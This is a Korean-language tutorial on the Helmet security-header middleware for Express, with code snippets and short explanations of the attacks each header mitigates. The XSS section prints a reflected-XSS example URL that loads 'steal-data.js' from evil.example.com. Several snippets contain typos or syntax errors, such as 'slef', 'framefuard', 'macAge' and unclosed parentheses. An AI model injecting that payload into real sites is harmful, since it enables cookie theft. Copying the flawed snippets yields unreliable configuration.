# Helmet

> helmet은 일부 HTTP 응답 헤더를 설정하는데 도움이 되는 13개의 미들웨어 기능을 모아놓은 것 입니다.

## 1. 설치하기

```zsh
npm install helmet --save
```

## 2. 사용하기

헤더가 확실하게 설정되로록 미들웨어 스택의 앞부분에 사용하는 것이 가장 좋다. 익스프래스 3을 사용하는 경우, `app.router` 전에 미들웨러를 나열해야 합니다.

```javascript
const express = require("express");
const helmet = require("helmet");

const app = express();

app.use(helmet());
```

개별적으로 사용할 수도 있다.

```javascript
app.use(helmet.noCache());
app.use(helmet.frameguard());
```

default로 실행되는 미들웨어를 사용하지 않도록 설정할 수 있다.

```javascript
app.use(
  helmet({
    frameguard: false,
  })
);
```

미들웨어에 대한 옵션을 설정할 수 있습니다. 이와 같은 설정 옵션에는 미들웨어가 기본값인지 관계없이 항상 포함되어 있다.

```javascript
app.use(
  helmet({
    framefuard: {
      action: "deny",
    },
  })
);
```

## 3. Modules

| Module                                                             | Description                                   | Include by default |
| ------------------------------------------------------------------ | --------------------------------------------- | ------------------ |
| [contentSecurityPolicy](#content-security-policy)                  | Setting Content Security Policy               |                    |
| [dnsPrefetchControl](#dns-prefetch-control)                        | Controls browser DNS prefetching              | YES                |
| [expectCt](#expect-ct)                                             | Handling Certificate Transparency             |                    |
| [featurePolicy](#feature-policy)                                   | Limit your site’s features                    |                    |
| [frameguard](#frameguard)                                          | Prevent clickjacking                          | YES                |
| [hidePoweredBy](#hide-powered-by)                                  | Remove the X-Powered-By header                | YES                |
| [hsts](#hsts)                                                      | HTTP Strict Transport Security                | YES                |
| [ieNoOpen](#ie-no-open)                                            | Sets X-Download-Options for IE8+              | YES                |
| [noSniff](#noSniff)                                                | Keep clients from sniffing the MIME type      | YES                |
| [permittedCrossDomainPolicies](#x-permitted-cross-domain-policies) | Handling Adobe products’ crossdomain requests |                    |
| [referrerPolicy](#referrer-policy)                                 | Hide the Referer header                       |                    |
| [xssFilter](#xss-filter)                                           | Adds some small XSS protections               | YES                |

### Content Security Policy

CSP 모듈은 악의적인 Javascript, Css 또는 plubins등의 주입을 막는 Content-Security-Policy 헤더를 설정한다. 브라우저는 기본적으로 페이지에서 요청하는 모든 코드를 다운로드하여 실행한다. 하지만 CSP를 설정함으로써 브라우저에게 어떠한 조건의 리소스만 실행하거나 렌더링 하라고 지시를 내릴 수 있다.

##### 공격

해커는 당신의 웹 페이지에 무언가를 올릴 수 있다면, 많은 악행을 할 수 있다. 가장 끔찍한 공격은 아마 당신의 페이지에 악의적인 Javascript를 올리는 cross-site scripting (XSS)일 것이다. 만약 내가 덩신의 페이지에서 Javascript를 실행할 수 있다면, 나는 인증 쿠키나 사용자 로그를 훔치는것과 같은 많은 악행들을 저지를 수 있다.

Javascript를 실행할 수 없어도 공격자가 할 수 있는 것은 많다. 만약 내가 당신의 사이트에 아주 작은 1\*1의 투명 이미지를 넣을 수 있다면, 나는 당신의 사이트가 얼마나 많은 트래픽을 받는지 알 수 있을 것이다. 또한 플래시와 같은 취약한 브라우저 플러그인을 실행할 수 있다면, 나는 그 결함을 이용하여 당신이 원치 않는 일을 할 수 있을 것이다.

CSP는 특정한 공격을 막기 위한 것이 아니다. 이것의 목적은 당신이 기대하지 않는 그 어떤 것도 여러분의 웹 페이지에 올라갈 수 없게 하는 것이다.

##### Directives

Helmet의 `csp` 모듈은 Content Security Policies 설정을 도와준다.

```javascript
const csp = require("helmet-csp");

app.use(
  csp({
    directives: {
      defaultSrc: ["'self'", "default.com"],
      scriptSrc: ["'slef'", "'unsafe-inline'"],
      sandbox: ["allow-forms", "allow-scripts"],
      reportUri: "/report-violation",
      objectSrc: ["'none'"],
      upgradeInsecureRequests: true,
      workerSrc: false, // This is not set.
    },
  })
);
```

각 지시문에는 다음 키워드를 선택 적용할 수 있다.

| keyword       | description                                                    |
| ------------- | -------------------------------------------------------------- |
| none          | 어떳 것도 허용하지 않습니다                                    |
| self          | 현재 출처에서는 허용하지만 하위 도메인에서는 허용되지 않습니다 |
| unsafe-inline | 인라인 자바스크립트, 인라인 스타일을 허용합니다                |
| unsafe-eval   | eval과 같은 텍스트 자바스크립트 메커니즘을 허용합니다          |

다음과 같은 directives를 지원합니다.

| kebab-cased               | camel-cased             | description                                                                                                             |
| ------------------------- | ----------------------- | ----------------------------------------------------------------------------------------------------------------------- |
| base-uri                  | baseUri                 | document의 `<base>` 요소에 사용할 수 있는 URL을 제한                                                                    |
| block-all-mixed-content   | blockAllMixedContent    | HTTPS를 사용하여 페이지가 로드될 때 HTTP를 사용하여 asset을 로드하는 것을 방지                                          |
| child-src                 | childSrc                | `<frame>`이나 `<iframe>`과 같은 요소를 사용하여 로드된 웹 작업자나 내포된 검색 컨텍스트에서 가능한 소스를 정의          |
| connect-src               | connectSrc              | 스크립트 인터페이스를 사용하여 로드할 수 있는 URL 제한                                                                  |
| default-src               | defaultSrc              | 다른 fetch directive들의 fallback으로 제공됨                                                                            |
| font-src                  | fontSrc                 | `@font-face`를 사용하여 로드할 수 있는 소스를 지정                                                                      |
| form-action               | formAction              | 지정된 컨텍스트에서 제출 대상으로 사용될 수 있는 URL을 제한                                                             |
| frame-ancestors           | frameAncestors          | `<frame>`, `<object>`, `<embed>` 혹은 `<applet>`을 사용하여 임베디드 될 페이지의 부모를 지정                            |
| frame-src                 | frameSrc                | `<frame>`과 `<iframe>`과 같은 요소를 사용하여 내포된 검색 컨텍스트를 로드하는데 사용 가능한 소스를 지정                 |
| img-src                   | imgSrc                  | 가능한 이미지와 favicon 소스 지정                                                                                       |
| manifest-src              | manifestSrc             | 가능한 manifest 소스 지정                                                                                               |
| media-src                 | mediaSrc                | `<audio>`, `<video>`, `<track>` 요소들을 사용하여 로드할 수 있는 가능한 소스를 지정                                     |
| object-src                | objectTypes             | `<object>`, `<embed>`, 그리고 `<applet>`                                                                                |
| plugin-types              | pluginTypes             | 로드할 수 있는 리소스 타입들을 제한하여 document에 포할될 수 있는 플러그인 설정을 제한                                  |
| prefetch-src              | prefetchSrc             | prefetch 혹은 prerendered될 수 있는 소스들을 지정                                                                       |
| report-to                 | reportTo                | `SecurityPolicyViolationEvent` 실행                                                                                     |
| report-uri                | reportUri               | 컨턴츠 보안 정책 위반 시도를 보고하도록 user agent에 지시. 보고서는 HTTP POST 요청을 통해 지정된 URI로 JSON 문서로 전송 |
| require-sri-for           | requireSriFor           | 페이지의 스크립트나 스타일에 SRI 사용을 요청                                                                            |
| sandbox                   | sandbox                 | `<iframe>` sandbox 속성과 유사하게 리소스 요청에 대한 샌드박스 활성화                                                   |
| script-src                | scriptSrc               | 가능한 javascript 소스 지정                                                                                             |
| style-src                 | styleSrc                | 가능한 style 소스 자정                                                                                                  |
| upgrade-insecure-requests | upgradeInsecureRequests | 사이트의 모든 불안정한 URL(HTTP)들을 보안 URL(HTTPS)로 교체한 것처럼 처리하도록 use agent에 지시                        |
| worker-src                | workerSrc               | 가능한 `Worker`, `SharedWorker`, `ServiceWorker` 소스 지정                                                              |

##### CSP 위반

만약 `reportUri`를 지정했다면, 브라우저는 모든 CSP 위반을 서버로 POST 할겁니다.

```javascript
app.use(
  bodyParser.json({
    type: ["json", "application/csp-report"],
  })
);

app.post("/report-violation", (req, res) => {
  if (req.body) {
    console.log("CSP violation: ", req.body);
  } else {
    console.log("CSP Violation: No data received!");
  }

  res.status(204).end();
});
```

모든 브라우저가 같은 방식으로 CSP 위반을 보내는 것이 아니여서, 약간의 작업이 필요할 수 았습니다.

> 만약 CSRF 모듈을 사용하고 있다면, CSRF 토큰 없이는 문제가 있을 수 있다. 이를 해결하기 위해서는 CSP 보고 경로를 CSRF 미들웨어 두면 됩니다..

이 모듈의 `reportOnly` 옵션은 헤더의 `Content-Security-Policy-Report-Only`를 변환합니다. 이는 브라우저가 위반 사항을 URI로 보고하도록 지시하지만, 리소스가 로드되는 것은 차단하지는 않는다.

```javascript
app.use(csp({
  directives: {
    // ...
  },
  reportOnly: true
})
```

`reportOnly` 모드를 사용할지 여부를 동적으로 결정할 수 있습니다. 동적 kill switch는 request와 response 객체와 함꼐 호출되며 `boolean`을 반환합니다.

```javascript
app.use(csp({
  directives: {
    // ...
  },
  reportOnly: (req, res) => req.query.cspmode === 'debug'
})
```

##### Browser Sniffing

기본적으로 이 모듈은 들어오는 `User-Agent`를 보고 탐지된 브라우저에 따라 다른 헤더를 전송합니다. 예를 들어, Chrome 25 이전 버전은 `X-WebKit-CSP`라는 대체 헤더를 사용하며, 이 모듈이 이를 처리합니다. 브라우저가 감지되지 않으면, 이 모듈은 2.0 사양으로 모든 헤더를 설정합니다. 이런 Browser Sniffing을 사용하지 않도록 설정하고 최신 브라우저로 성정하려면 `browserSniff` 옵션을 `false`로 설정하십시오.

```javascript
app.use(csp({
  directives: {
    // ...
  },
  browserSniff: false
})
```

legacy 헤더를 포함하여 모든 헤더를 `true`로 설정하려면 `setHeaders` 옵션을 `true`로 설정하십시오. 이렇게하면 `User-Agnet`에 기반한 헤더의 값이 변경된다는 점에 유의하십시오.

```javascript
app.use(csp({
  directives: {
    // ...
  },
  setAllHeaders: true
})
```

오래된 안드로이드 브라우저는 버그가 생길 수 있으므로 디폴트가 `false`입니다.

```javascript
app.use(csp({
  directives: {
    // ...
  },
  disableAndroid: true
})
```

##### Generating nonces

`<script>`를 안전하게 평가하기 위해서 nonce를 동적으로 생성할 수 있습니다.

```javascript
app.use(function (req, res, next) {
  res.locals.nonce = uuidv4();
  next();
});

app.use(
  csp({
    directives: {
      scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
    },
  })
);

app.use(function (req, res) {
  res.end(`<script nonce="${res.locals.nonce}">alert(1 + 1);</script>`);
});
```

##### Using CSP with a CDN

`CSP`는 기본적으로 페이지를 요청하는 브라우저에 맞춰 헤더를 생성합니다.만약 앞에서 `CDN`을 사용하고 있다면 잘못된 헤더를 캐시하여 CSP를 쓸모 없게 만듭니다. 이럴 경어 `CDN` 사용을 피하거나 `browserSniff`fmf `false`로 설정하세요.

### DNS Prefetch Control

`X-DNS-Prefetch-Control` 헤더를 설정하여 브라우저의 DNS 프리페치를 비활성화할 수 있습니다.

##### 공격

URL을 방물할 때 브러우저는 IP 주소를 검색해야 한다. 이 과정을 DNS라 합니다. 브라우저는 사용자가 링크를 클릭하거나 어딘가에서 리소스를 로드하기 전에 이러한 DNS 요청을 시작할 수 있습니다. 아것은 사용자가 방문하지 않은 것을 방문한 것처럼 보일 수 있습니다.

##### 헤더

`X-DNS-Prefetch-Control`헤더는 브라우저에서 DNS 프리페치를 수행해야 하는지 여부를 알려준다. 모든 부라우저가 모든 상황에서 이것을 지원하지는 않지만, 이것을 끄면 지원하는 모든 부라우저에서 불가능하게 할 수 있다. 대부분의 브라우저는 DNS 프리페치를 수행하지 않으므로 이 헤더를 무시할 수 있습니다.

```javascript
const helmet = require("helmet");

app.use(helmet.dnsPrefetchControl());
```

```javascript
const dnsPrefetchControl = require("dns-prefetch-control");

// Sets "X-DNS-Prefetch-Control: off".
app.use(dnsPrefetchControl());

// Sets "X-DNS-Prefetch-Control: off".
app.use(dnsPrefetchControl({ allow: false }));

// Sets "X-DNS-Prefetch-Control: on".
app.use(dnsPrefetchControl({ allow: true }));
```

### Expect-CT

HPKP를 데체하여 서버 관리자는 `Expext-CT` 헤더를 사용할 수 있습니다. `Expect-CT` 헤더를 사용하면 해당 웹 사이트에 오발급된 인증서를 사용하지 않도록 방지할 수 있습니다. 이 기능을 사용하게 되면 브라우저는 웹사이트의 인증서가 CT 로그에 존재하는지 확인하게됩니다.

| key        | required | description                                                                                    |
| ---------- | :------: | ---------------------------------------------------------------------------------------------- |
| max-age    |   YES    | 브라우저가 Expect-CT 설정을 캐시하는 시간을 나타내며 초 단위로 입력해야 합니다.                |
| reoirt-uri |          | 유효하는 CT 정보를 얻지 못하면 브라우저가 보고서를 보내는 곳을 나타내며 URI로 입력해야 합니다. |
| enforce    |          | 보고서만 보낼지, 아니면 설정된 값에 위반되는지를 방문자에게 알립니다.                          |

```javascript
const expectCt = require("expect-ct");

app.use(
  expectCt({
    enforce: true,
    macAge: 30,
    reportUri: "http://example.com/report",
  })
);
```

### Feature-Policy

브러우저가 사용할 수 있는 기능을 제한합니다. 예를 들어 풀 스크린이나 vibration API들이 있다.

##### 공격

코드의 표면적을 제한하는 것은 좋은 생각입니다. 적다는건 공격할게 적다는 것을 의미하기도 합니다. 웹 브라우저들은 진동, 전체 화면, 마이크 접속 등에서 많은 차이점을 가지고 있습니다. 이것들은 매우 유용한 반면에 모든 스크립트를 사용하고 싶지 않을 수 있다.

##### 헤더

`Feature-Policy` 헤더는 브라우저에서 사용할 수 있는 기능을 알려준다.

```
Feature-Policy: notifications 'none'; payments example.com
```

##### 코드

```javascript
const helmet = require("helmet");

app.use(
  helmet.featurePolicy({
    features: {
      fullscreen: ["'self'"],
      vibrate: ["'none'"],
      payment: ["example.com"],
      syncXhr: ["'none'"],
    },
  })
);
```

```javascript
const featurePolicy = require("feature-policy");

app.use(
  featurePolicy({
    features: {
      vibrate: ["'self'"],
      syncXhr: ["'none'"],
    },
  })
);
```

### Frameguard

`X-Frame-Options` 헤더를 설정하여 클릭재킹 공격을 완화합니다.

##### 공격

클릭재킹 공격은 꽤 영립합니다. 공격자는 여러분이 실제로 클릭하고 싶지 않은 것을 클릭하기 원하며, 링크 버튼을 숨겨서 당신을 속여 클릭하게 만듭니다.

##### 헤더

`X-Frame-Options` 레더는 브라우저가 당신의 웹 페이지를 iframe에 넣지 않도록 지시합니다. 브라우저가 iframe을 로드할 때, `X-Frame-Options` 헤더 값을 확인하고 허용되지 않으면 로딩을 중단합니다.

1. `X-Frame-Options: DENY`: 누구도 이 페이지를 iframe에 넣지 못합니다.
2. `X-Frame-Options: SAMEORIGIN`: 같은 origin을 제외한 누구도 이 페이지를 iframe에 넣지 못합니다.
3. `X-Frame-Options: ALLOW-FROM http://example.com`: 해당 사이트를 제외한 누구도 이 페이지를 iframe에 넣지 못합니다.

##### 코드

```javascript
const frameguard = require("frameguard");

app.use(frameguard({ action: "deny" }));

app.use(frameguard({ action: "sameorigin" }));
app.use(frameguard()); // defaults to sameorigin

app.use(
  frameguard({
    action: "allow-from",
    domain: "http://example.com",
  })
);
```

### Hide Powered-By

`X-Powered-By` 헤더를 제거하여 사이트의 잠재적 취약점을 파악하기 조금 어렵게 만듭니다.

##### 공격

해커들은 당신이 Express와 Node를 사용하는것을 안다면, 이것들의 잘 알려진 취약점을 이용할 수 있습니다. Express는 모든 request에 `X-Powered-By`헤더를 설정해서 무슨 기술로 서버가 돌아가는지를 나타냅니다. 해커들은 이것을 이용할 수 있습니다. 만약 그들이 Express나 Node의 취약점을 알고 있고, Express-powered를 볼 수 있다면, 그들의 타겟이 되기 쉽습니다.

##### 해결

해결책은 단순히 헤더를 제거하는 겁니다. 솔직히 말하자면, 마음 먹은 해커가 이 헤더를 보지 못한다고 포기하지는 않을 것이다. 이들은 다른 단서를 보고 당신이 Node를 쓰고 있다는 것을 찾아낼 수 도 있고, 아니면 단순히 많은 공격을 시도하고 먹히는 방법을 찾아 낼 수도 있을 것입니다. 단순히 이 헤더를 생략하는 것이 취약점을 이용할 수 없다는게 아닙니다. 하지만 이것을 조금 늦추거나, 게으른 헤커를 단념시킬 수 있습니다. 또한 헤더를 제거하면 바이트 수가 줄기 때문에 아주 약간의 성능적 이점도 있습니다.

##### 코드

```javascript
app.disable("x-powered-by");
```

```javascript
const hidePoweredBy = require("hide-powered-by");

app.use(hidePoweredBy());

app.use(helmet.hidePoweredBy({ setTo: "PHP 4.2.0" }));
```

### HSTS

유저들을 HTTPS 상에 유지시키기 위해서 `Strict-Transport-Security` 헤더를 설정합니다.

##### 공격

HTTPS는 항상 완벽하지는 않지만 안전한 프로토콜입니다. 반면에 HTTP는 끔찍합니다. "Vanilla" HTTP 유저들은 중간자 공격에 취약하며 암호화여 전송하지 않습니다.

##### 헤더

`Strict-Transport-Security` HTTP 헤더는 브라우저에게 HTTPS를 고수하고 블안전한 HTTP 버전을 절대 방문하지 말라고 지시합니다. 브라우저가 이 헤더를 보면, 60일동안 HTTPS만을 사용하여 사이트를 방문합니다.

```
Strict-Transport-Security: max-age=5184000
```

헤더는 HTTP 사용자에게 HTTPS로 전환하라고 말하지 않고, HTTPS 사용자에게 계속 남아 있으라고만 말합니다.

##### 코드

```javascript
const hsts = require("hsts");

const sixtyDaysInSeconds = 5184000;
app.use(
  hsts({
    maxAge: sixtyDaysInSeconds,
  })
);
```

##### Including subdomains

`includeSubDomains`은 `default`로 포함되어있다. 제외하려면 `false`로 설정하세요.

```javascript
app.use(
  helmet.hsts({
    maxAge: sixtyDaysInSeconds,
    includeSubDomains: false,
  })
);
```

##### Preloading HSTS in Chrome

일부 브라우저는 사이트의 HTST를 브라우저에서 구어지게 제출할 수 있게 해줍니다. 다음과 같이 `preload`를 헤더에 추가할 수 있습니다. 당신의 자신의 자격을 확인하거나 hstspreload.org에 사이트를 제출할 수 있습니다.

```javascript
app.use(
  helmet.hsts({
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true,
  })
);
```

### IE No Open

`X-Download-Options`를 설정해서 Internet Explorer가 사이트의 context를 다운로드하는 걸 막는다.

##### 공격

이 공격은 오래된 버전의 Internet Explorer에만 영향을 미칩니다. 기본적으로 오래된 버전의 Internet Explorer는 이러한 HTML 파일들을 열도록 허용합니다. 일부 웹 애플리케이션은 신뢰할 수 없는 HTML 다운로드할 수 있게 제공합니다. 일반적으로, 오래된 Internet Explorer는 이러한 HTML을 사이트 컨텍스트에서 열 수 있게 해주며, 이는 매우 위험합니다.

##### 헤더

`X-Download-Options` 헤더를 `noopen`으로 설정 할 수 있다. 이는 오래된 버저의 Internet Explorer에서 악성 HTML을 사이트 context에서 실행시키기 위해 다운 받는 것을 막아줍니다.

##### 코드

```javascript
const ieNoOpen = require("ienoopen");

app.use(ieNoOpen());
```

### noSniff

`noSniff`(Don't Sniff Mimetype 미들웨어)는 브라우저가 보안에 영향을 미칠 수 있는 MIME 타입 유형을 추측(sniff)하는 것을 방지합니다. `X-Content-Type-Options` 헤더를 `nosniff`로 설정하여 수행합니다.

##### 공격

Mime 타입들은 보여지는 파일의 종류를 결정하는 방법이다. PNG 이미지는 image/png, JSON 파일은 application/json, Javascript 파일은 일반적으로 text/javascript 타입을 갖습니다. 브라우저는 파일을 로드할 때 서버의 Content-Type 헤더를 읽어서 파일이 무엇인지 판단합니다. 만약 Javascript를 `text/html`의 `Content-Type`으로 보내고, 브라우저가 'MIME sniffing'이라 불리는 작업을 수행하면, 파일의 내용을 보고 Javascript면 그대로 실행합니다. 이 말은 서버가 잘못된 `Content-Type`을 보내도, Javascript가 실행 될 수 있다는 겂니다.

이런 MIME snffing 공격은 백터가 될 수 있습니다. 공격자가 `.jpg` 파일 확장자로 이미지를 업로드하지만 실제로 그 내용은 `html`일 수 있다. 이 이미지를 방문하면 브라우저가 `html`파일을 실행할 수 있고, 여기에는 악성 Javascript가 있을 수 있다! 아마 가장 끔찍한 공격은 데이터 대신 악성 플래시 플러그인을 로드하는 Roestta Falsh라 불리는 공격일 것입니다.

##### 헤더

`X-Content-Type-Options` 헤더는 브라우저에 MIME 유형을 감지하지 말라고 지시합니다. 이 헤더가 `nosniff`로 설정되면, 브라우저는 서버의 말을 신뢰하고 잘못된 경우 리소스를 차단합니다.

##### 코드

```javascript
const noSniff = require("dont-sniff-mimetype");

app.use(noSniff());
```

### X-Permitted-Cross-Domain-Policies

헬멧의 crossdomain 디들웨어는 Adobe Flash와 Adove Acrobat이 콘텐츠를 사이트에 업로드 한는 것을 막습니다.

##### 공격

Adove Flash나 Adobe Acrobat에서 사이트가 다르더라도 당신의 도메인을 콘텐츠로 로드할 수 있습니다. 이것은 드문 경우로 예상치 못한 데이터 공개나 대역폭 사용의 원인이 될 수 있습니다.

##### 헤더

`X-Permited-Cross-Domain-Policies` 헤더는 플래시나 Acrobat 같은 클라이언트에서 cross-domain 정책을 알려줍니다. 도메인의 데이터를 로드시키고 싶지 않으면 헤더를 설정해야 합니다.

```
X-Permitted-Cross-Domain-Policies: none
```

##### 코드

```javascript
const permittedCrossDomainPolicies = require("helmet-crossdomain");

app.use(permittedCrossDomainPolicies()); // none
app.use(permittedCrossDomainPolicies({ permittedPolicies: "master-only" }));
app.use(permittedCrossDomainPolicies({ permittedPolicies: "by-content-type" }));
app.use(permittedCrossDomainPolicies({ permittedPolicies: "all" }));
```

### Referrer Policy

이 모듈은 `Referrer-Policy` 헤더를 설정하여 Referer 헤더의 동작을 제어할 수 있습니다.

##### 공격

Referer HTTP 헤더는 일반적으로 서버의 출처를 알리기 위해 브라우저가 설정합니다. 예를 들어 wikipedia.org으로 이동하는 링크를 클릭하면 위키피디아 서버는 Referer: example.com을 볼 수 있다.

##### 헤더

새로운 Referrer-Policy HTTP 헤더는 브라우저가 Referer 헤더를 설정하는 것을 제어할 수 있게 해줍니다.

```
Referrer-Policy: no-referrer
```

origin이 같은 페이지에서만 Referer 헤더를 보낼 수 있다.

```

Referrer-Policy: same-origin
```

##### 코드

```javascript
const referrerPolicy = require("referrer-policy");

// Sets "Referrer-Policy: no-referrer".
app.use(referrerPolicy());
app.use(referrerPolicy({ policy: "no-referrer" }));
// Sets "Referrer-Policy: same-origin".
app.use(referrerPolicy({ policy: "same-origin" }));
// Sets "Referrer-Policy: unsafe-url".
app.use(referrerPolicy({ policy: "unsafe-url" }));
// Sets "Referrer-Policy: no-referrer,unsafe-url"
app.use(
  referrerPolicy({
    policy: ["no-referrer", "unsafe-url"],
  })
);
```

### XSS Filter

`X-XSS-Protection` 헤더를 설정하여 XSS 공격을 방지합니다.

##### 공격

Cross-site scripting(XSS)는 공격자가 웹 페이지를 탈취할 수 있는 방법입니다. 이 공격의 목적은 희생되는 브라우저의 Javascript의 제어를 가져오는 것 입니다. 헤커가 이를 성공하면, 당신의 행동을 기록하거나, 당신으로 위장하거나, 인증 쿠키들을 훔치는등 수 많은 나쁜 일일 할 수 있습니다.
`Refelcted XSS`는 XSS 공격중 하나입니다. 일반적으로, HTML에 직접 입력하는 쿼리 문자열에 Javascript를 넣어 작동합니다. 삽입된 Javascript는 공격자가 누군가에게 악의적인 쿼리 문자열을 제공하여 그들의 Javascript를 실행할 수 있게 해줍니다.
예를 들어, Goobar라는 검색 엔진을 가동중이라고 합시다. 검색할때마다 결과 위에 검색어가 표시됩니다. "javscript jokes"를 검색했다고 합시다. 검색하면 전체 URL은 다음과 같다.

```
https://goober.example.com/search?query=javascript+jokes
```

만약 `<script src="http://evil.example.com/steal-data.js"></script>`라고 검색하면 전체 URL은 다음과 같다.

```
https://goober.example.com/search?query=<script%20src="http://evil.example.com/steal-data.js"></script>
```

##### 헤더

이 헤더는 모든 XSS 공격을 막아주지는 않습니다. 몇몇 종류만을 막아주며, 다른 완화 조치들이 훨씬 좋습니다. 단순 Reflected XSS 공격을 브라우저가 감지하는 것은 비교적 간단합니다. 위의 예에서, 브라우저는 쿼리 문자열과 동일한 경우 `<sciprt>`안의 ㅓavascript를 싱행시키지 않도록 선택할 수 있습니다. 어떤 브라우저는 기본적으로 이를 감지하지만, 그렇지 않은 브라우저도 있습니다. 이러한 브라우저가 이 단순한 케이스를 확인하도록 하려면 `X-XSS-Protection` 헤더를 `1; mode=block`로 설정해야 합니다.

이 헤더는 오래된 버전의 Internet Explorer에서는 후러씬 심각한 보안 취약성을 유발하기에, 여기서는 사용하지 않는 것이 현명합니다.

##### 코드

```javascript
const xssFilter = require("x-xss-protection");

app.use(xssFilter());
```

모든 버전의 IE에서 사용을 강제하고 싶을때는 다음과 같이 합니다.

```javascript
app.use(xssFilter({ setOnOldIE: true }));
```

크롬 베이스 브라우저에서는, Report URI를 설정할 수도 있습니다.

```javascript
app.use(xssFilter({ reportUri: "/report-xss-violation" }));
```

`mode`를 `null`로 설정할 수도 있습니다.

```javascript
app.use(xssFilter({ mode: null }));
```

## 4. 출처

- [helmet](https://helmetjs.github.io/)
